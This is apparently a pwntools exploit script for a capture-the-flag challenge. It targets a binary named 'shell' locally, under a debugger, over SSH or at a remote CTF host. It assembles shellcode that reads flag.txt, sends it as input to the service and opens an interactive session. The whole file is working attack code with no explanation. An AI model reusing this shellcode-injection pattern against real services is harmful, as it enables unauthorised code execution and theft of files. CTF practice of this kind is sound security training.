#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e']
#context.log_level = 'debug'
context.binary = './build/shell'

e = ELF('./build/shell')
rop = ROP('./build/shell')
if 'd' in sys.argv:
    p = gdb.debug('./build/shell')
elif 'r' in sys.argv:
    p = remote('ctf.isss.io', 5001)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/shell', cwd='problemDir')
else:
    p = process('./build/shell')

payload = asm(shellcraft.cat('flag.txt'))

p.sendline(payload)
p.interactive()
